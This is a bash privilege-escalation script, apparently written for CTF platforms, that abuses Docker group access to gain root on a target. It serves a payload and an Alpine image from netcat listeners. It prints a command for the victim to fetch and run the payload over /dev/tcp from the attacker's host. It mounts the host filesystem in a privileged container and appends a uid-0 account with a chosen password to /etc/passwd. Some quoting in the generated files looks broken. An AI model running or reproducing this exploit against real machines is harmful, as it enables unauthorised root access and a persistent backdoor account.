#!/bin/bash

LPORT=8000 # Change this
ROOTNAME="user999" # Change this
ROOTPASS="passwd999" # Change this

LHOST=$(ifconfig | grep "inet " | cut -d " " -f 10 | grep "10") # Here I grepped 10 for tun0 ip address (vpn connection, like tryhackme or hackthebox...), change it if trying to pwn a LOCAL MACHINE...
DOCKER_EXPL=$(mktemp)
LPASS=$(openssl passwd -1 -salt mysalt $ROOTPASS)

bash ./alpine-builder.sh
echo

sleep_func(){
	for i in {1..3}; do
		echo -n "."; sleep 1
	done
}

cat <<EOF > Dockerfile.expl
FROM scratch
ADD alpine.tar.gz /
RUN echo '$ROOTNAME:$LPASS:0:0:root:/root:/bin/bash' >> /mnt/etc/passwd; exit" > /tmp/newAccount.sh
CMD ["/tmp/newAccount.sh"]
EOF

cat <<EOF > $DOCKER_EXPL
#!/bin/bash

sleep_func(){
	for i in {1..5}; do
		echo -n "."; sleep 1
	done
}

cd /
sleep_func
cat < /dev/tcp/$LHOST/$LPORT > ./alpine.tar.gz
sleep_func
cat < /dev/tcp/$LHOST/$LPORT > ./Dockerfile

docker build . -t alpine:v0.1
docker run -v /:/mnt/ --privileged -it alpine:v0.1 /bin/bash /tmp/newAccount.sh
Sorry, BUT THE PASSWORD IS: $ROOTPASS"
su $ROOTNAME
EOF

echo "Run in the remote machine: 'bash -c \"cat < /dev/tcp/$LHOST/$LPORT > /tmp/docker-exploit.sh\"; bash /tmp/docker-exploit.sh'"
echo

nc -q 3 -nvlp $LPORT < $DOCKER_EXPL
echo -n "DOCKER EXPLOIT uploaded, sleep for 3s"
sleep_func
nc -q 3 -nvlp $LPORT < ./alpine.tar.gz
echo -n "Alpine uploaded, sleep for 3s"
sleep_func
nc -q 3 -nvlp $LPORT < ./Dockerfile.expl
rm -f $DOCKER_EXPL
